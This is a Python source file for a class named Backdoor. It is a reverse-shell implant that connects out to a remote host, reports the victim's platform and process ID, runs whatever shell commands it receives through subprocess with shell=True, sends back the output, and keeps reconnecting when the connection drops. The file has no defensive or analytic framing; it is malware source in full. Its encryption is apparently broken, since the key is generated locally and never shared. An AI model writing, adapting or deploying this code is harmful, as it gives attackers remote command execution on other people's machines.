import socket
import subprocess
import json
import base64
import os
import sys
import time
import hashlib
from cryptography.fernet import Fernet

class Backdoor:
    def __init__(self , host, port, payload_name):
        self.host = host
        self.port = port
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.payload_name = payload_name

    def encrypt_data(self, data):
        return self.cipher.encrypt(data.encode())

    def decrypt_data(self, encrypted_data):
        return self.cipher.decrypt(encrypted_data).decode()

    def send_encrypted(self, sock, data):
        encrypted = self.encrypt_data(json.dumps(data))
        sock.sendall(encrypted)

    def receive_encrypted(self, sock):
        try:
            data = sock.recv(4096)
            if not data:
                return None
            decrypted = self.decrypt_data(data)
            return json.loads(decrypted)
        except Exception as e:
            print(f"Decryption error: {e}")
            return None

    def execute_command(self, cmd):
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )

            return {
                "success": True,
                "output": result.stdout,
                "error": result.stderr,
                "return_code": result.returncode
            }
        except Exception as e:
            return {
                "success": False,
                "output": "",
                "error": str(e),
                "return_code": -1
            }

    def run(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((self.host, self.port))

                print(f"Connected to {self.host}:{self.port}")


                self.send_encrypted(sock, {
                    "type": "backdoor_info",
                    "platform": sys.platform,
                    "pid": os.getpid(),
                    "payload_name": self.payload_name
                })

                while True:
                    command = self.receive_encrypted(sock)

                    if not command:
                        break

                    cmd_type = command.get("command")

                    if cmd_type == "execute":
                        result = self.execute_command(command.get("data"))
                        self.send_encrypted(sock, {
                            "type": "result",
                            "id": command.get("id"),
                            "data": result
                        })

                    elif cmd_type == "ping":
                        self.send_encrypted(sock, {
                            "type": "pong"
                        })

            except Exception as e:
                print(f"Connection error: {e}")
                time.sleep(5)  # Wait before reconnecting
